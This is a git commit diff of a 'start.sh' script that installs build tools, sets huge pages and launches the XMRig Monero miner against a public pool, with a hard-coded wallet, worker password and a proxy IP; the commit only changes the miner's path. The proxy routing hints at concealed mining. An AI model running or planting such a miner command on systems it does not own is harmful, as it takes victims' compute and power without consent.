25fd8abe4bb72ac237869729fb0aa16fed9a7630
Dadora-Lee <dadorasoft@gmail.com>
2025-05-13 10:28:14 +0900

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,3 +1,3 @@
 sudo apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
 sudo sysctl -w vm.nr_hugepages=1280
-./xmrig -o pool.supportxmr.com:3333 -u 42Z6ArQrn7iLBXj93QDsLY7Ho1xM4dXavSz1j8n8YuawUTvXCxaVgUmBpqtHkaFzM4TGBRT6s6kpEdezjwoMhbjJHFe19BU -p XMR_791_AHS -k --proxy=98.175.31.195:4145
+~/docker_sh/xmrig -o pool.supportxmr.com:3333 -u 42Z6ArQrn7iLBXj93QDsLY7Ho1xM4dXavSz1j8n8YuawUTvXCxaVgUmBpqtHkaFzM4TGBRT6s6kpEdezjwoMhbjJHFe19BU -p XMR_791_AHS -k --proxy=98.175.31.195:4145
